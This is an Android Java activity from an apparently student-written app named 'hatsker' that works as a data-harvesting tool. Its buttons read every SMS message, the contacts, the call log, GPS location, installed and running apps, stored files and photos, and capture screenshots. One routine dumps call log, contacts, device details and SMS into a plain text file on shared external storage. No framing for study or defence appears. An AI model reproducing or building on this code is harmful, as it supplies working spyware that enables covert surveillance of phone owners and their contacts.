package com.example.student.hatsker;

import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.provider.CallLog;
import android.widget.ImageView;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.Date;
import java.util.List;
import android.Manifest;
import android.content.pm.PackageManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.support.v4.app.ActivityCompat;

import java.io.ByteArrayOutputStream;

public class MainActivity extends AppCompatActivity implements LocationListener {
    boolean isRegistered = false;
    int duration = Toast.LENGTH_SHORT;
    MediaPlayer mediaPlayer;
    MainActivity act = this;
    ExecutorService executorService;

    LocationManager locationManager;
    String mprovider;


    ImageView imageView;
    Bitmap mbitmap;
    Button captureScreenShot;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        final MainActivity this_ = this;
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        executorService = Executors.newFixedThreadPool(5);

        captureScreenShot = (Button) findViewById(R.id.getScr);
        imageView = (ImageView) findViewById(R.id.imageView);

        final SMSreciever Res = new SMSreciever();
        final IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");

        Button goTo = (Button)findViewById(R.id.goTo);
        goTo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(this_, NewPanel.class);

                startActivity(intent);
            }
        });

        Button ServiceOnButton = (Button) findViewById(R.id.toService);
        ServiceOnButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!isRegistered) {
                    registerReceiver(Res, intentFilter);
                    isRegistered = true;
                    TextView offOn = (TextView) findViewById(R.id.offOn);
                    offOn.setText("On");
                } else {
                    Toast.makeText(this_, "Receiver is already on", duration).show();
                }
            }
        });

        Button Sng = (Button) findViewById(R.id.SongsButton);
        Sng.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                mediaPlayer = new MediaPlayer();
                ContentResolver contentResolver = getContentResolver();
                Uri songUri = MediaStore.Audio.Media.INTERNAL_CONTENT_URI;
                Cursor songCursor = contentResolver.query(songUri, null, null, null, null);
                if (songCursor != null && songCursor.moveToFirst()) {
                    int songTitle = songCursor.getColumnIndex(MediaStore.Audio.Media.TITLE);
                    do {
//                        String songPath=songUri.getPath();
//                        try {
//                            mediaPlayer.setDataSource(songPath);
//                            mediaPlayer.start();
//                        } catch (IOException e) {
//                            e.printStackTrace();
//                        }
                        String currentTitle = songCursor.getString(songTitle);
                        Log.d("hfgjg", currentTitle);
                    } while (songCursor.moveToNext());
                }
            }
        });

        final GetInfo getInfo = new GetInfo();


        Button ServiceOffButton = (Button) findViewById(R.id.offService);
        ServiceOffButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (isRegistered) {
                    unregisterReceiver(Res);
                    isRegistered = false;
                    TextView offOn = (TextView) findViewById(R.id.offOn);
                    offOn.setText("Off");
                } else
                    Toast.makeText(this_, "Receiver is already off", duration).show();
            }
        });

        Button getPicture = (Button) findViewById(R.id.picture);
        getPicture.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String[] projection = new String[]{MediaStore.Images.ImageColumns._ID, MediaStore.Images.ImageColumns.DATA, MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME, MediaStore.Images.ImageColumns.DATE_TAKEN, MediaStore.Images.ImageColumns.MIME_TYPE};
                final Cursor cursor = getApplicationContext().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.ImageColumns.DATE_TAKEN + " DESC");
                if (cursor.moveToFirst()) {
                    final ImageView imageView = (ImageView) findViewById(R.id.imageView);
                    String imageLocation = cursor.getString(1);
                    File imageFile = new File(imageLocation);
                    if (imageFile.exists()) {
                        Bitmap bm = BitmapFactory.decodeFile(imageLocation);
                        imageView.setImageBitmap(bm);
                    }
                }
            }
        });

        final Button getF = (Button) findViewById(R.id.FileGetter);

        getF.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                GetFiles(path);
            }
        });
///////////////////////////////////////////////////////////////////////////////
        Button getCon = (Button) findViewById(R.id.getContacts);
        getCon.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String phoneNumber = null;
                Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
                String _ID = ContactsContract.Contacts._ID;
                String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
                String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
                Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
                String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
                ContentResolver contentResolver = getContentResolver();
                Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null, null);
                if (cursor.getCount() > 0) {
                    while (cursor.moveToNext()) {
                        String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                        String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                        int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));
                        if (hasPhoneNumber > 0) {
                            Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[]{contact_id}, null);
                            while (phoneCursor.moveToNext()) {
                                phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                                Log.d("hfgjg", name + " " + phoneNumber);
                            }
                        }
                    }
                }
            }
        });
/////////////////////////////////////////////////////////////////////////
        Button getCallLog = (Button) findViewById(R.id.CallLg);
        getCallLog.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("Call details: ", getCallDetails());
            }
        });
///////////////////////////////////////////////////////////////////////////////////
        final Button getSysInfo = (Button) findViewById(R.id.sysInfo);
        getSysInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("System info details: ", getInfo.getInfosAboutDevice(act));
                installedApps();
                runningApps();
            }
        });
        /////////////////////////////////////////////////////////////////////////////////////

        Button getFile = (Button) findViewById(R.id.getFile);
        getFile.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                PutIntoFile();
            }
        });
        /////////////////////////////////////////////////////////////////////////////
        final Button getSms1 = (Button) findViewById(R.id.GetSMS1);
        getSms1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                getSms();
            }
        });
        /////////////////////////////////////////////////////////////////////////
        Button getScreen = (Button) findViewById(R.id.getScr);
        getScreen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                screenShot(view);
            }
        });




        //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        Button getGPS = (Button) findViewById(R.id.GetGpsAndGsm);
        getGPS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                Criteria criteria = new Criteria();

                mprovider = locationManager.getBestProvider(criteria, false);

                if (mprovider != null && !mprovider.equals("")) {
                    if (ActivityCompat.checkSelfPermission(this_, Manifest.permission.ACCESS_FINE_LOCATION)
                            != PackageManager.PERMISSION_GRANTED
                            && ActivityCompat.checkSelfPermission
                            (this_, Manifest.permission.ACCESS_COARSE_LOCATION)
                            != PackageManager.PERMISSION_GRANTED) {
                        return;
                    }
                    Location location = locationManager.getLastKnownLocation(mprovider);
                    locationManager.requestLocationUpdates(mprovider, 15000, 1, this_);

                    if (location != null)
                        onLocationChanged(location);
                    else
                        Toast.makeText(getBaseContext(), "No Location Provider Found Check Your Code", Toast.LENGTH_SHORT).show();
                }
            }
        });

        final Button getAccount = (Button) findViewById(R.id.getAccount);
        getAccount.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
            }
        });

        //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    }


    private void PutIntoFile() {
        File tempFile;
        File cDir = getBaseContext().getCacheDir();
        tempFile = new File(Environment.getExternalStorageDirectory() + "/" + "textffile.txt");
        FileWriter writer = null;
        try {
            writer = new FileWriter(tempFile);

            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone._ID,
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);

            cursor.moveToFirst();

            writer.write("Call details: " + getCallDetails() + "\n" + "Contacts: ID " +
                    cursor.getString(0) + " NAME " + cursor.getString(1) + " PHONE " + cursor.getString(2) +
                    "\n" + "System info details: " + GetInfo.getInfosAboutDevice(act) + "\nSMS:\n" + getSms());

            writer.close();
            File internal_m1 = getDir("custom", 0);
            File external_m1 = Environment.getExternalStorageDirectory();
            Log.i("assdf", external_m1.getPath());
        } catch (IOException e) {
            e.printStackTrace();
        }
        String strLine = "";
        StringBuilder text = new StringBuilder();
        try {
            FileReader fReader = new FileReader(tempFile);
            BufferedReader bReader = new BufferedReader(fReader);
            while ((strLine = bReader.readLine()) != null) {
                Log.i("DATA", strLine);
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Log.i("sdf", tempFile.getPath());
    }
///////////////////////////////////////////////////////////////////////
    private String getCallDetails() {
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        return sb.toString();
    }
    /////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////
    public void installedApps() {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                Log.d("App № " + Integer.toString(i), appName);
            }
        }
    }
    ///////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////
    public void GetFiles(String DirectoryPath) {
        Log.d("hfgjg", DirectoryPath);
        File f = new File(DirectoryPath);
        f.mkdirs();
        File[] files = f.listFiles();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                Log.d("hfgjg", files[i].getAbsolutePath());
                if (files[i].isDirectory()) GetFiles(files[i].getAbsolutePath());
            }
        }
    }
    /////////////////////////////////////////////////////////////////////////////////////////

    String path = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();


    public void screenShot(View view) {
        mbitmap = getBitmapOFRootView(captureScreenShot);
        imageView.setImageBitmap(mbitmap);
        createImage(mbitmap);
    }

    public Bitmap getBitmapOFRootView(View v) {
        View rootview = v.getRootView();
        rootview.setDrawingCacheEnabled(true);
        Bitmap bitmap1 = rootview.getDrawingCache();
        return bitmap1;
    }

    public void createImage(Bitmap bmp) {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        bmp.compress(Bitmap.CompressFormat.JPEG, 40, bytes);
        File file = new File(Environment.getExternalStorageDirectory() +
                "/capturedscreenandroid.jpg");
        try {
            file.createNewFile();
            FileOutputStream outputStream = new FileOutputStream(file);
            outputStream.write(bytes.toByteArray());
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
/////////////////////////////////////////////////////////////////////////////////////
    public void runningApps() {
        final ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        final List<ActivityManager.RunningTaskInfo> recentTasks = activityManager.getRunningTasks(Integer.MAX_VALUE);

        for (int i = 0; i < recentTasks.size(); i++) {
            Log.d("Executed app", "Application executed : " + recentTasks.get(i).baseActivity.toShortString() + "\t\t ID: " + recentTasks.get(i).id + "");
        }
    }
//////////////////////////////////////////////////////////

    @Override
    public void onLocationChanged(Location location) {
        Log.i("GPS.longitude", Double.toString(location.getLongitude()));
        Log.i("GPS.latitude", Double.toString(location.getLatitude()));
        System.out.println();
    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }

/////////////////////////////////////////////////////////////////////////////////////
    public String getSms() {
        ContentResolver cr = this.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;

        StringBuilder strBui = new StringBuilder();

        totalSMS = c.getCount();

        if (totalSMS >0 && c!=null) {

            strBui.append("\nTotal sms:" + Integer.toString(totalSMS));

            if (c.moveToFirst()) {

                c.moveToFirst();
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));

                    Date dateFormat= new Date(Long.valueOf(smsDate));

                    strBui.append("\nDate:" + dateFormat.toString() +
                            "\nNumber:" + number +
                            "\nBody:" + body +
                            "\n------------------");

                    Log.i("sms", dateFormat.toString());
                    Log.i("sms", number);
                    Log.i("sms", body);
                    Log.i("sms", "--------------");

                    c.moveToNext();
                }
            }

            c.close();

            return strBui.toString();
        }
        else
        {
            return "no sms";
        }
///////////////////////////////////////////////////////////////////////////////////////////////////


    }

}

